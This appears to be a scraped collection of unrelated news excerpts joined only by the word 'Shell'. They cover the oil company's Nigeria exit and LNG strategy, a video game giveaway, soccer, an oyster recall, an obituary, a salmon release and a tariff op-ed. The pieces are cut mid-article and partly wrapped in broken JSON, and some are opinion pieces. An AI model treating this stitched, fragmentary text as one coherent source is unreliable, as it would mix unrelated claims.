Shell cleans up its mess, consults local communities, and locks away sufficient funds to cover full remediation. In other words: no sneaking out of the crime scene in the dead of night.\n\nEven lawyers representing affected communities are livid at Shell\u2019s attempt to cut and run. As the law firm Leigh Day put it, \u201cIt would be unconscionable for Shell to pack up its onshore operations in Nigeria without cleaning up its mess and paying compensation\u2026 We consider that Shell, having made billions of pounds over decades from extracting oil resources from Nigeria, should fulfil its legal responsibilities and not leave behind an environmental catastrophe as it seeks to exit the Niger Delta.\u201d Unconscionable indeed \u2013 but conscience has never been Shell\u2019s strong suit.\n\nNearly 30 years after Ken Saro-Wiwa\u2019s execution, the Ogoni people (and many others in the Delta) are still in court, still demanding that Shell make amends. As activist Cindy Baxter bluntly said, \u201cNearly 30 years after Ken Saro-Wiwa and eight others were hung for protesting Shell\u2019s pollution, the Ogoni people are still fighting it in the courts. Before this corporation leaves the country, it must clean up \u2014 and pay for its environmental crimes.\u201d\n\nIn other words: Shell needs to clean up its damn mess. That\u2019s not exactly the happy ending Shell\u2019s PR team had in mind, but it\u2019s the bare minimum that the people of the Niger Delta deserve after decades of the company\u2019s profiteering and destruction. Shell can run from Nigeria, but it shouldn\u2019t be allowed to hide from the consequences of what it did there. The Niger Delta will remember \u2013 and so should we.\n\nShare this: Facebook\n\nTwitter\n\nEmail\n\nPrint\n\n\n\nLike this: Like Loading...\n\nThis website and sisters royaldutchshellgroup.com johndonovan.website , and shellnews.net , are owned by John Donovan .

            "content": "Fasten your seatbelts we\u2019re headed for stormy weather!\n\nThe abrupt announcement that Zoe Yujnovich, Shell\u2019s Integrated Gas & Upstream Director, directly responsiblefor its LNG and Upstream divisions is departing the end of March 2025, indicates that not all is well in Shell\u2019s two most important portfolios:\n\nFirstly, the impending oversupply of LNG in global markets is quickly changing the dynamics of the LNG marketplace: can Shell continue to maintain its pole position in this low price environment?\n\nSecondly, Shell\u2019s seeming inability to deliver on many upstream exploration projects is highlighted by two key projects in Namibia\u2013Graff and Jonker.\n\nIn the period January 2021-December 2024 the Shell share has moved up 55%: from $40 in 2021 to $62 in December 2024. Yet the chief obsession of Wael Sewan, Shell CEO since January 2023, is to drive up the company share price, which has barely moved in the two year period that he has been CEO. In January 2023 it was $57 and December 2024 was only $62.\n\nIn comparison, two of Shell\u2019s main competitors\u2014 ExxonMobil and Chevron\u2014have experienced high growth rates: between January 2021 and December 2024.\n\nExxonMobil\u2019s growth was 130%; in 2021 its share price was $46 and in 2024 it was $106. Chevron\u2019s share price went up 55%: in January 2021 it was $91 and in December 2024 it was $144.\n\nThe key however is market capitalization: Shell must play financial catch-up. Shell\u2019s market capitalization is only $208Billion; Chevron has a market cap of $281Billion and ExxonMobil $490Billion.\n\nShell\u2019s growth is tied directly linked to its LNG and Upstream portfolios.\n\nThe reckoning has been swift and brutal. This is a story of the drama behind the scene. The reasons why Zoe Yujnovich had to fall on her sword.\n\nLNG: Becoming a low cost marketplace?\n\nThe latest LNG forecast published by the Institute for Energy Economics and Financial Analysis (IEEFA) in April 2024 for the period 2024-2028, indicates that storm clouds are emerging.\n\n\u201cLackluster demand growth, combined with a massive wave of new export capacity is poised to send global liquefied natural gas (LNG) markets into oversupply within two years\u201d, the report says. \u201cIn Japan, South Korea, and Europe\u2014which together account for more than half of the world\u2019s LNG demand\u2014combined imports fell in 2023 and will likely continue falling through 2030.\u201d\n\nIEEFA expects global LNG supply capacity to rise to 666.5 MTPA by the end of 2028, which exceeds International Energy Agency (IEA) demand scenarios through 2050.\n\n\u201cIn Japan, formerly the world\u2019s largest LNG importer, demand fell 8% in 2023. Since 2018, Japan\u2019s annual LNG imports have fallen 20%. A planned increase in nuclear and renewables generation\u2014spurred by climate and energy policies, along with years of high LNG prices\u2014 will likely send demand even lower.\n\nIn South Korea, historically the largest buyer of U.S. LNG, imports fell almost 5% last year. Long-term climate and energy plans in South Korea envision LNG imports falling 20% through the mid-2030s, as solar, wind and nuclear plants come online.\n\nEurope\u2019s LNG imports stagnated in 2023, defying expectations of rising imports to replace lost Russian gas supplies. Europe\u2019s overall gas consumption fell 20% in the past two years due to high prices, energy security mandates and climate policies. IEEFA expects Europe\u2019s LNG demand to peak by 2025 and decline through 2030.\n\nIEEFA expects global LNG supply capacity to rise to 666.5 MTPA by the end of 2028, which exceeds International Energy Agency (IEA) demand scenarios through 2050.\n\nThe Case of China\n\nIn 2023 China consumed 14Trillion cubic feet (Tcf) of natural gas consisting of:\n\nDomestic production of 8Tcf\n\nPiped imports 2.5Tcf\n\nImported LNG 3.5Tcf\n\nChina\u2019s appetite for future imported LNG could well be put on hold for the time being. As the country\u2019s overall gas demand rises, domestic gas production and pipeline imports may limit LNG imports until prices fall to more competitive levels. Only then will China increase LNG purchases from spot and short-term markets. Also because of increases in long-term contracts, however, China may seek to mitigate a growing surplus of term volumes by selling excess supplies abroad.\n\nNot surprising. China, along with Japan and South Korea are already intra-partners selling their excess gas supplies, often in competition with Shell.\n\n\u201cIEEFA estimates that LNG prices would have to fall below $8-$9/MMBtu to compete with the cost of China\u2019s pipeline gas imports and below $6/MMBtu to compete with domestically produced gas. Until then, China will continue to have an economic incentive to favor pipeline gas imports over imported LNG.\u201d\n\nRenewables, which are proving to be cheaper than imported LNG, are also a major reason why imported LNG will be much less in demand . China has been the world\u2019s largest and fastest-growing producer of renewable power for more than a decade. In 2020, China committed to have 1,200 GW of renewable capacity by 2030, but is on track to meet that goal five years early.\n\nThe Case of India\n\nAccording to IEEFA\u2026\u201d The government of India has set ambitious targets to increase the country\u2019s overall natural gas consumption from 51.3 Million Tonnes Per Annum (MMTPA) to 139MMTPA by 2030, with the majority of growth expected to be met by LNG imports. In 2022, however, LNG imports fell 17% due to LNG price spikes, demonstrating the country\u2019s sensitivity to volatile prices. As markets eased in 2023, India\u2019s LNG demand rebounded by 9% to 22 MTPA. However, demand remains well below levels seen before the Russian invasion of Ukraine.\u201d\n\nUSA and Qatar\n\nCurrently the US has five LNG projects totaling more than 71MMTPA under construction.\n\nDevelopment of Qatar\u2019s North Field complex will boost the country\u2019s liquefaction capacity by 64 MMTPA through 2030. The first of the North Field trains is expected to come online in 2025 or 2026, with 48 MMTPA likely to come online by 2028 and an additional 16 MMTPA coming into service by 2030.\n\nQatar\u2019s LNG industry boasts the cheapest LNG production costs in the world, due to its abundant, inexpensive and liquids-rich gas supplies.\n\nLNG Canada\n\nThe 14-MMTPA LNG Canada project, spearheaded by Shell, PetroChina, Mitsubishi Corporation and KOGAS, saw its pipeline costs more than double. This project will commence production in 2025.\n\nAfrica\n\nTOTALEnergies plans to restart its long-delayed $20Billion Mozambique liquefied natural gas (LNG) project has received positive news: the board of the U.S. Export-Import Bank has approved a nearly $5Billion loan for the project, moving the project closer to the starting gate.\n\nRovuma LNG was supposed to become ExxonMobil\u2019s futuristic model LNG project. Security issues remains the key reason that this project has been halted.\n\nShell\u2019s Upstream Dilemma\n\nIf your direct responsibility is to ensure that exploration brings in lucrative projects and you fail to achieve this you have a bitter pill to swallow especially when your competitors\u2014TOTALEnergies and Galp Energia\u2014do succeed.\n\nShell\u2019s total capex for 2025 is between $22Billion-$25Billion per year, of which some 80% is earmarked for oil and gas. Earlier industry sources indicated that Shell was devoting 25% of its deepwater exploration budget for Namibia.\n\nHowever, in January 2025 Shell shocked the oil industry and the Government of Namibia by announcing that it was writing off $400Million on its Namibian campaign. Yet paradoxically on March 10, 2025, Shell announced that it planned to drill up to 5 exploration wells on the southern extension of the Orange Basin offshore South Africa. This is the same geological play which they wrote off in Namibia and despite that they plan to go full steam ahead almost next door in South Africa. Certainly, the message that Shell is sending is very confusing to oil industry observers and even to its frustrated shareholders.\n\nThe earlier optimism of Shell\u2019s Graff and Jonker projects was dialed back by Maggy Shino, Namibia\u2019s Petroleum Commissioner, Ministry of Mines and Energy who stated that the Graff project apparently only has 200Million barrels and Jonker has 300Million barrels recoverable.\n\nTako Koning, a renowned Calgary-based geologist familiar with Namibian oil and gas matters, offers this explanation in the January 25, 2025 issue of Africa Oil + Gas Report:\n\n\u201c Shell\u2019s CEO Wael Sawan spoke to analysts in Shell\u2019s meeting reviewing second-quarter results and said \u2026: \u2018It\u2019s a complex subsurface. While there is no shortage of hydrocarbon volume, the question is going to be the commercial producibility and the mobility of these molecules. That\u2019s why we are taking our time. We\u2019re thinking through it and making sure we have a good enough picture before we commit our shareholders\u2019 capital to this development. He also said that \u2018Time is our friend, as we are learning from both our own analysis as well as the analysis and activities of others\u2019\u201d.\n\nIn the same period TOTALEnergies announced the Venus-1X discovery of oil and associated gas.\n\nAccording to Koning\u2026\u201dTOTALEnergies recently announced plans to bring Venus onstream at the end of this decade at 180,000 barrels of oil per day through an FPSO. TOTALEnergies CEO Patrick Pouyanne envisions that one day as many as seven floating FPSOs could be operating on his company\u2019s acreage in the Orange Basin. In the meanwhile, TotalEnergies has stated that by end of 2025 they will be able to announce where they are with the development of their discoveries.\u201d\n\nIn the same timeframe Galp Energia announced their Mopane oil discovery estimated to holds over 10 billion barrels of oil in-place. According to Koning ..\u201d using a recovery factor of 25 percent, \u2018first pass estimates of the reserves for Mopane are 2.5 billion barrels of oil\u201d. Indeed, since that time Galp Energia completed the Mopane-3X appraisal well which achieved very favorable results.\n\nSome Final Thoughts\n\nNo doubt Shell\u2019s top priority is to ensure shareholders that their golden dividends will continue to be paid out. Shell current dividend yield is 4.22%, which above all must be maintained.\n\nYet shareholders will want to know how their dividends will fare in the coming 5 to 10 years. Shell\u2019s strategy is not re-assuring.\n\nThe future is an evolving low price environment which will in the coming decade be oversupplied by excess LNG; and Asian and EU countries requiring less LNG because of energy efficiency, renewables, and cheaper piped gas.\n\nThe company, unfortunately, aside from its LNG and Upstream portfolios which controls 80% of Shell\u2019s capital budget cannot be judged to be a serious company in terms of new energy. It has since the appointment of Wael Sewan as CEO frittered away any prospects of appearing to being a serious renewable energy player.\n\nNo Shell\u2019s future game plan is not obvious and no doubt will be critically examined by analysts and shareholders in the future.\n\nGerard Kreeft, BA (Calvin University, Grand Rapids, USA) and MA (Carleton University, Ottawa, Canada), Energy Transition Adviser, was founder and owner of EnergyWise.

The six-figure contract, secured in March 2020, spanned five years and has now reached completion, with the project officially in production.\n\nFulkrum played a key role in ensuring the quality and compliance of equipment manufactured for the project, conducting extensive vendor surveillance across multiple locations. With numerous vendor visits over the years, Fulkrum\u2019s expert team worked closely with suppliers to uphold the highest industry standards, ensuring that all equipment met the strict requirements necessary for Shell\u2019s first new operated facility in the UK North Sea in over 20 years.\n\nThe Penguins floating production, storage, and offloading (FPSO) vessel is one of the most advanced platforms of its kind. It is expected to produce up to 45,000 barrels of oil equivalent per day (boed) at peak production and provide enough natural gas to heat approximately 700,000 UK homes annually. The new FPSO will have around 30% lower operational emissions compared to its predecessor, Brent Charlie.\n\n\u201cWe are incredibly proud to have played a key role in the Penguins project, providing vendor surveillance over the past five years,\" said Stacey Buchan, Operations Manager at Fulkrum. \"Working alongside such a well-respected name in the industry and contributing to a project that will have a lasting impact on the UK\u2019s energy security has been an honour. Our team\u2019s expertise and commitment to quality assurance were instrumental in ensuring the success of this project, and we look forward to continuing our partnerships with Shell and other industry leaders in the future.\u201d\n\nWith the Penguins FPSO now in production, Fulkrum celebrates another successful milestone, reinforcing its reputation as a trusted partner for major energy projects worldwide.",

Over 50 documents have been reviewed, with special emphasis on cargo tank design, including tank integrity analysis and suitability of material.\n\nWith dimensions capped at 290 meters in length and a 12-meter draft to access key East Asian ports, the designed ship mirrors the size of a 174,000 cbm LNG carrier. It features 15 cylindrical tanks that store 74,000 cbm of liquid CO2 at around -50\u00b0C and 6\u20138 barg, a low-pressure industry standard. The vessel is also designed for future onboard capture of CO2 from the main engine exhaust.\n\nCarbon capture and storage (CCS) is set to play a key role in decarbonization of industry in Asia Pacific. Emitting countries such as Japan, Korea, and Singapore are studying the possibility of shipping substantial quantities of their own CO2 to store locations within the wider region.\n\nThis necessitates the development of larger capacity vessels than those currently planned for European CCS projects. Low-pressure cargo tank designs are a key enabler to commercialize these large LCO2 ships to enable transportation of CO2 at lower cost.\n\n\u201cThis AiP underscores the importance of joint innovation and collaboration in advancing solutions that support the development of the wider CCS value chain. Scale is essential to drive down the cost of CCS and this work demonstrates the feasibility of large CO2 carriers with a low carbon footprint,\u201d said Mathias S\u00f8rhaug, Business Development Director CO2 shipping, DNV Maritime said:\n\n\u201cBased on a comprehensive technology study, conducted in collaboration with Shell, this innovative design is expected to set new benchmarks in safe, efficient, and sustainable large-scale CO\u2082 shipping,\u201d added Evert Gr\u00f8dal, Managing Director of Brevik Engineering.",

A hardening mechanic allows you to negate damage temporarily during combos, providing various counterattack options alongside the standard hit and dodge mechanics typical of this genre.\n\nThe game features a distinctive mechanic involving \"Shells,\" which are different fallen warriors that players can inhabit within the world to unlock diverse play styles. Although it wasn't as well-received as some other entries in the Soulslike category, it has cultivated a following over the years and has received multiple expansions.\n\nTo enhance this week further, Mortal Shell isn't the only freebie available from the Epic Store. Additionally, a complimentary content pack for World of Warships, titled the \u201cAnniversary Party Favor,\u201d is also available for free download. This add-on provides free credits, XP, a new cruiser, and more for World of Warships players. While it may not be a second free game, it certainly adds extra value to this week's EGS giveaways.\n\nThe new Mortal Shell promotion is currently live on the Epic Games Store. The game normally sells for $29.99, but it's free for all PC gamers for the next week. This giveaway will be available until March 20, which is also when another free game will be introduced.\n\nAnd as always, make sure to use our comparator to find the best deals on your upcoming favorite games.",

Among the new players on the roster are U.S. Women\u2019s National Team forward Yazmeen Ryan, who represented the U.S. at the 2025 SheBelieves Cup. Ryan is a two-time NWSL champion and won her most recent title in 2023 with NJ/NY Gotham FC. She is one of three former Gotham players to join the Dash and that includes veteran goalkeeper Abby Smith and midfielder Delanie Sheehan.\n\nNWSL veteran Danielle Colaprico and Christen Westphal joined the Dash over the offseason and both bring extensive postseason experience to the team and as teammates the duo helped San Diego Wave FC lift the NWSL Shield in 2023. Offensively, the Dash added forward Messiah Bright and Evelina Duljan, a member of the 2024 Orlando Pride team that won the double (NWSL Shield and Championship) last year.

She led the Blue Devils to the semifinals of the 2024 Women\u2019s College Cup and the ACC regular season title as a graduate student.\n\nPreparation for the 2025 began well before the offseason with new contracts for captain Jane Campbell (June 2024), defender Paige Nielsen (Aug. 2024), defender Natalie Jacobs (Sept. 2024), forward Michelle Alozie (Sept. 2024), midfielder B\u00e1rbara Olivieri (Sept. 2024) midfielder Sarah Puntigam (Oct. 2024) and midfielder Sophie Schmidt (Oct. 2024). Defender Avery Patterson (Dec. 2024) also signed a new contract with the team.\n\nThe team faced San Diego and Portland Thorns FC during a preseason trip to California as part of the Coachella Valley Invitational. Houston split the two matches against the NWSL clubs with a draw against San Diego and a victory over Portland. Houston\u2019s preseason slate also featured a friendly against Dallas Trinity FC from the USL Super League. Graham scored a goal in the second half to secure a 1-1 draw in that match.\n\nThe Washington Spirit visit Houston after opening their season with a penalty kick shootout triumph over Orlando last week in the 2025 NWSL Challenge Cup. Leicy Santos scored the equalizer in the second half following a free kick outside the box. Goalkeeper Aubrey Kingsbury tallied a save in the shootout and Tara McKeown converted her penalty kick to secure Washington\u2019s first trophy of the year. The Spirit were without Croix Bethune, Courtney Brown, Ouleye Sarr, Heather Stainbrook and Andi Sullivan due to injury. Trinity Rodman joined the team in Orlando and on the bench but did not enter the match. She was listed as questionable on Thursday with a back injury.\n\nIn addition to Santos, the Spirit signed Mexican international Rebecca Bernal following a transfer from C.F. Monterrey. The Spirit also signed Narumi Miura as a free agent after beginning her NWSL career with North Carolina FC. Washington reinforced each line this offseason with the addition of defender Kysha Sylla on loan from Olympique Lyon, Scottish international goalkeeper Sandy MacIver and Brazilian forward Tamara Bolt. Washington looks to surpass a recording-breaking campaign that included a trip to the NWSL Championship last season plus new single-season club records in wins (18), points (56) and goals (51).\n\nThe Dash will visit the Nation\u2019s Capital in Sept. to face the Spirit at Audi Field. Fans can watch the match on Sept. 28 at noon CT on NWSL+ or Paramount+",

Norovirus is a highly contagious pathogen that can cause severe gastroenteritis.\n\nBackground\n\nThe recall was initiated after multiple cases of norovirus infection were reported to the California Department of Public Health in connection with consumption of the recalled oysters.\n\nDistribution\n\nThe affected product was shipped to distributors in California and may have been sent to other states as well.\n\nProduct Details\n\nProduct \u2013 Frozen half shell oysters\n\nProcessor Name \u2013 Daihung Mulsan Co., LTD., CERT NO.

Alternatively, the product should be disposed of safely.\n\nConsumers and restaurants should thoroughly sanitize any surface or utensils that have come into contact with the recalled products.\n\nHealth Risks\n\nConsumers who have been exposed to the recalled oysters, and are experiencing symptoms of norovirus infection, should contact their healthcare provider immediately.\n\nNorovirus contamination poses a significant health risk, particularly to individuals with compromised immune systems. What makes norovirus contamination especially concerning is that infected food often appears, smells, and tastes normal, making it difficult to detect without proper testing.\n\nSymptoms of norovirus infection typically include diarrhea, abdominal cramps, nausea, vomiting, and fever. These symptoms can be particularly severe in vulnerable populations like children, the elderly, and those with compromised immune systems.\n\nIn recent months, multiple recalls and safety alerts have been issued for raw oysters due to potential norovirus contamination, including:\n\nCommenting on this article, the nation\u2019s leading norovirus lawyer said, \u201cNorovirus is extremely contagious. Although most norovirus symptoms aren\u2019t dangerous, consumers need to be aware of dehydration. Anyone who suspects they may have contracted norovirus should drink plenty of clear fluids like water and sports drinks.\u201d",

Its copper carapace acts as a kind of solar helmet, protecting the glazing from high summer sun from the south and lower sun from the east and west. So what would normally be considered a major constraint on design has been turned into an opportunity for architectural expression.\n\n\"Copper Bottom has a sculptural origami-esque carapace, but shorn of its shell, it is a simple two-story cuboid box with a sloping lid. There are two good reasons for this simple form for the interior volume. First, form factor. Best to keep houses as compact as practicable to minimize the skin to volume ratio. Second, airtightness.

Raised in Marietta and enjoying the freedoms the 30s and 40s brought, John graduated from Marietta High School in 1946, where he played basketball, was a cheerleader and voted \u201cFriendliest\u201d of his senior class. He worked at Holeproof Hosery before attending Tennessee Wesleyan Junior College in Athens, Tennessee where he met Ella Jo Stevens. They married in 1950 after graduation and John enlisted in the army. They were first stationed in Louisiana, and this is where John discovered his leadership skills and first began to teach Sunday school, something he continued to do well into his 80s. After his discharge from the army, he headed to Nashville, Tennessee, where he majored in Education at Peabody College.\n\nAfter finishing school, John and Ella Jo headed back to Marietta. During these years, John was a Sunday school teacher and youth leader at Marietta First United Methodist Church, taking on a director role at the first Marietta FUMC Youth Camp (which still takes place each summer). He was also active in the Rotary Club during his working days in Marietta.\n\nAlthough John was a wonderful storyteller and teacher, he decided teaching in the classroom was not for him, and so he chose to sell insurance for People\u2019s and then Northwestern. In 1969, while working with one of his clients, he discovered the Hemlock Inn in Bryson City, North Carolina was for sale. A long-time dream was fulfilled by purchasing the Inn that became his happy place and his calling. John and Ella Jo had the gift of hospitality and loved serving their guests and community for over 20 years.\n\nJohn and Ella Jo retired to Lake Junaluska, North Carolina to travel some and enjoy together time until Ella Jo passed away in 1998. John continued to be active at his church and with the Inn. After several years John reconnected with Roberta Lineburger, a fellow Innkeeper, and they married in December 2002. They were active at Long\u2019s Chapel Methodist Church, teaching Sunday school, helping with the soup kitchen ministry, and starting Celebrate Recovery. When Roberta passed away in 2016, John moved back to the Inn where he lived peacefully for the remainder of his life. He loved the Inn where he could tell his stories, reminisce with the guests, and enjoy the wonderful home-cooked meals.\n\n\u201cBuddy\u201d (as his friends called him) or \u201cPapa\u201d (as his grandchildren knew him) loved to dance the jitterbug, was a big fan of Gladys Knight and the Pips, and was known for his legendary wit and seemingly endless array of memorable sayings that he would pull out for any and every occasion. Most of all, he loved Jesus as a close friend and would read his Bible daily, often alongside a glass bottle Coca-Cola and pimento cheese sandwich.\n\nJohn is survived by his 2 children: Dianne Shell Hylton and Elaine Shell (Morris) White; his 7 grandchildren: Jennifer (Doug) Roberts, Laurel (Matt) Henson, Chad (Maggie) Gilbert, Katie Pilson, Andrew (Jeanette) White, Steven (Sarah) White, and John Thomas (Alli) White; and his 20 great grandchildren: Avery, Jacob, and Tyler Austin, Joe and Susan Henson, John Douglas (JD) and George Roberts, Seamus and Declan Gilbert, Noah and Ella Jo Pilson, Addley Hylton, Madelyn, Anna Lewis, and Olivia White, Eleanor (Nora) and Clara White, and Hudson, Haddon and Helen White.\n\nA Celebration of Life will be held on Sunday, March 23, 2025, at 2:00 p.m. at Long\u2019s Chapel. A gathering will follow.\n\nThe care of Mr. Shell has been entrusted to Wells Funeral Home of Waynesville",

The sediment flow was so bad in 2024 that it filled and blocked the creek under a longstanding bridge, requiring emergency action to allow fish passage (related story here.).\n\nThe Suquamish Tribe\u2019s chum salmon fry will stay in Shell Creek \u2014 along with the same-age chum fry hatched in the creek \u2014 for up to two weeks, imprinting to this creek before heading out to sea. This contrasts with coho salmon fry, which spend the first year of their life in the creek. The chum salmon that survive life at sea will return as adults in three to four years to spawn in Shell Creek.\n\nThe City of Edmonds should be proud to have so many property owners along the creek that support preserving our streams for salmon and allowing the Edmonds Stream Team to study and enhance salmon and their habitat, Scordino said. \u201cSpecial thanks for this successful salmon release go to Sandra Centala (property owner), the Suquamish Tribe and the Edmonds Environmental Council board members who assisted the Stream Team,\u201d he added.\n\nAdditional photos of the Suquamish Tribe\u2019s Grovers Creek Hatchery and the transport/release of the chum salmon fry to Shell Creek are posted on the Edmonds Environmental Council\u2019s website.",

But it\u2019s his new role that he thinks has the most possibilities.\n\nShell is No. 45 on CSP\u2019s 2024 Top 202 ranking of U.S. c-store chains by store count.\n\n\u201cSince taking on this role, it has struck me just how much more growth potential the convenience retail branch of our business has in every region,\u201d Bunch said. \u201cWhilst there are regional variations, the shift towards urbanization, convenience shopping, seamlessly integrated digital experiences and more recently, the growing need for convenient and rapid electric vehicle charging, present huge opportunities.\u201d\n\nWith a global footprint across 80 markets with a network of 47,000 retail fuel and convenience sites, serving 33 million customers every day, Bunch said Shell has a strong heritage in mobility and convenience, and he has a clear ambition of ensuring the company becomes the most preferred and valuable mobility and convenience brand within Shell\u2019s core markets.\n\n\u201cWe\u2019re already one of the most preferred convenience retail brands, the largest global producer and trader of advanced biofuels and a leader in electric vehicle charging capability, so I don\u2019t think there is anyone better placed to capture the growth potential that the emerging convenience trends provide,\u201d he said.\n\nWhat Bunch is most excited to accomplish is growing the company\u2019s strategic partnerships.\n\n\u201cWe operate in an ecosystem of partnerships, from world-leading global convenience brands to a 75-year technical partnership with Ferrari supporting their F1 team with fuel and lubricant technical innovation,\u201d he said. \u201cWe need to grow together, and I\u2019m convinced its only by collaborating with the very best partners that we will meet out ambitions.\u201d\n\nHeading into 2025, Bunch said there will continue to be examples of channel blurring in the industry, where retailers are offering better coffee, hot food and grocery options. Globally, Shell has a great track record in foodservice, he said.\n\n\u201cWe are already selling around half a billion cups of coffee in our global network and have more than 2,500 Shell Caf\u00e9s in 23 of our direct markets,\u201d he said.\n\nFollowing the acquisition of the Timewise network in Texas, Bunch said the company has recently launched its first food store with a barista offer for the United States.\n\n\u201cTo grow our customer reach, we are also investing in our digital, loyalty and personalization capabilities,\u201d he said. \u201cWe are tapping into a wide range of technologies including ordering ahead, delivery and ordering through screen and are constantly working on the range of food and coffee we offer, catering to the preferences of the local consumer.\u201d\n\nBunch also sees the energy transition and the transition to electric vehicles as a significant opportunity for convenience retail and foodservice.\n\n\u201cOur recent driver survey confirmed that EV drivers are willing to drive further to where they can get a better experience \u2013 faster charging but also the ability to get a great cup of coffee, a quick meal or wait in a comfortable drivers\u2019 lounge,\u201d he said.\n\nWith more customers switching to EVs, Bunch said this potentially means lower fuel sales for some players in the industry.\n\n\u201cBut with continued focus on quality fuels, the addition of EV charging in key locations and even better convenience retail offers, we think we have a compelling reason for drivers to choose Shell stations more often,\u201d he said.\n\nIn the U.S., Shell serves about 8 million customers per day with a brand presence at approximately 12,000 fueling stations across 49 states. It owns and operates nearly 200 convenience retail sites. Globally, London-based Shell serves around 33 million customers per day at its mobility sites, who visit for quality fuels, EV charging and convenience and non-fuel products and services.\n\nMembers help make our journalism possible.

The collaboration is entering a new decade with the extension and simultaneous expansion of their joint contract. Shell is the premium technology and innovation partner and, in the future, the energy partner of BMW M Motorsport. The partnership is visible worldwide in the biggest racing series, including the FIA World Endurance Championship (FIA WEC) and the IMSA WeatherTech SportsCar Championship (IWSC). The collaboration extends far beyond just the racing events.\n\nTen days ago, Shell and BMW M Motorsport celebrated the renewal of their partnership with the spectacular design of the #20 Shell BMW M Hybrid V8 at the FIA WEC season opener in Qatar. The LMDh car will compete in the entire World Championship season, including the legendary 24 Hours of Le Mans (FRA), adorned in Shell\u2019s colors. BMW M works driver Sheldon van der Linde (RSA) remains the face of Shell in the cockpit of the BMW M Motorsport race cars. He will be a regular driver for the entire season in FIA WEC and IWSC. In both racing series, Shell prominently appears as a partner of BMW M Motorsport, highlighting the global dimension of the collaboration. With van der Linde, Shell celebrated its greatest sporting success in 2022 when the young South African became the DTM champion driving the Shell BMW M4 GT3.\n\nStarting from the 2025 season, Shell will simultaneously be the Premium Technology, Innovation, and now also the Energy Partner of BMW M Motorsport. Accordingly, BMW M Motorsport exclusively uses and promotes Shell products such as Shell Helix and Shell EV Plus. Shell and BMW M Motorsport are working on joint future projects as part of their technology and development partnership. These include more sustainable lubricants, e-fluids for electric vehicles, and innovative fuel and energy concepts for motorsport projects. As Shell is also the official partner of the BMW M Trackdays, BMW M customers also enjoy the Shell premium products.\n\nFranciscus van Meel (CEO of BMW M GmbH): \u201cWithout strong partners like Shell, engagements by BMW M in series production and BMW M Motorsport in racing are unthinkable. The fact that we can look back on ten years of collaboration is extraordinary \u2013 and I am very pleased that we are now reaching the next level together. In addition to close collaboration within our current racing programs, the development of new future technologies in both the racing and series production sectors is crucial. As mobility and, thus, the entire automotive industry are changing rapidly, it requires partners who share our pursuit of innovation and perfection. This is absolutely the case with Shell.\u201c\n\nAysun Akik (Vice President of New Business Development and Global Key Accounts, Shell Lubricants): \u201cThis announcement marks an exciting milestone in our unwavering partnership with BMW M Motorsport. Over the last decade, we have been pushing the boundaries together, celebrating successes in major race series all over the world. As the number one lubricants supplier, Shell will continue to deliver quality solutions and together with BMW M Motorsport, help bring the pleasure of driving to customers globally.\u201d",

            "content": "To make a protectionist omelet, you\u2019ve got to break a few economic eggs.\n\nIf you don\u2019t like that joke, just know it\u2019s about as strained as the Trump administration\u2019s explanations for how its trade actions are supposed to reverse the rise in the cost of eggs. According to the Bureau of Labor Statistics, the average cost of a dozen eggs nearly doubled between January 2024 and January 2025.\n\n\u201cDonald Trump is going to bring the price of eggs down now,\u201d said Commerce Secretary Howard Lutnick on NBC\u2019s Meet the Press Sunday. \u201cDonald Trump\u2019s tariffs are\u2014here\u2019s the idea. All these other countries, like India, for instance, when Modi was in town, right, 1.4 billion people, and they won\u2019t buy a bushel of our corn. Europe\u2014always blocking our farmers. As our farmers can sell more and more overseas, you\u2019re going to see the price of food in America come down. It\u2019s a volume thing.\u201d\n\nSure, Lutnick\u2019s scrambled response doesn\u2019t make a whole lot of sense, but at least it\u2019s consistent. The Trump administration\u2019s answer to so many problems\u2014from the distribution of fentanyl and the flow of illegal immigrants to the federal budget deficit and national security concerns\u2014is to embrace tariffs. Whether these protective actions are intended as a negotiating tactic or a policy end themselves is one of the enduring questions of the second Trump administration so far. But the impulse to go to the tariff well remains strong, even when America\u2019s trade regime has little direct influence on the problem at hand.\n\nThat certainly describes our current egg crisis. On Meet the Press, Lutnick did not inspire confidence that he even understands why prices have skyrocketed in the past year. The former financial services executive placed the blame on Joe Biden for \u201cjust killing chickens trying to worry about things.\u201d\n\nThe \u201cthings\u201d he\u2019s referring to are the outbreaks of the H5N1 type of highly pathogenic avian influenza, otherwise known as bird flu, ravaging the nation\u2019s commercial chicken flocks since last year. And Biden\u2019s supposedly wanton and wasteful killing was actually the U.S. Department of Agriculture\u2019s requirement to cull hens at infected facilities in order to limit the spread of the disease. Trump\u2019s administration, by the way, is so far continuing to implement this \u201cstamping-out policy.\u201d\n\nThe subsequent drop in the supply of eggs (which causes prices to rise) is the predictable but devastating consequence of the bird flu outbreaks, a fact that Trump\u2019s agriculture secretary, Brooke Rollins, appears to recognize. In an op-ed for the Wall Street Journal last month, Rollins outlined what she described as her five-step plan to lower egg prices, which includes more preventative measures to stop infections from spreading and research for effective vaccines.\n\nNotably missing from Rollins\u2019 list was even a smidgen of lip service to the idea that taking protectionist trade action would help, though the department is in talks to increase egg imports from other countries, building on an effort begun in the Biden administration. Last year, egg imports accounted for a fraction of a percentage of the American market, so without much in the way of established trade partnerships for eggs, bringing in more eggs is proving difficult.\n\nMeanwhile, Trump\u2019s threats to implement reciprocal tariffs\u2014which would see the U.S. raising tariffs on goods imported from foreign countries to match the rates those countries charge on imports to their country\u2014could spell disaster for these efforts to shore up the egg supply with imports. That\u2019s according to Joe Glauber, a three-decade veteran of the USDA who capped his career as the department\u2019s chief economist. \u201cTurkey has been a major exporter of eggs to the U.S. in recent years (over 6 million dozen in 2024),\u201d said Glauber, who is a senior research fellow at the International Food Policy Research Institute and a visiting fellow at the American Enterprise Institute. \u201cIronically, if the reciprocal tariff proposal were to go into effect, imported eggs from Turkey would become prohibitively expensive.\u201d No kidding. Turkey\u2019s current tariff rate for eggs is a staggering 76.5 percent.\n\nThe true answer to the egg shortage is one no populist politician wants to admit: wait for things to improve. The bird flu outbreaks are akin to a natural disaster, wiping out supply with no obvious way to quickly reverse course. Egg producers will need to replenish their laying flocks in order to meet demand, which could take several months.\n\nMany of the proposed solutions, such as Rollins\u2019 pledge to deploy 20 epidemiologists to \u201cprovide actionable and timely advice to producers\u201d on how to avoid avian influenza infection, aim to prevent future outbreaks but would fail to address the current crisis. And there are tradeoffs to implementing vaccines.\n\n\u201cVaccinations are controversial as they are costly, and would likely have to be constantly updated as the H5N1 virus mutates,\u201d said Glauber. \u201cTrading partners are reluctant to approve imports from countries where H5N1 is present and not controlled through eradication.\u201d",

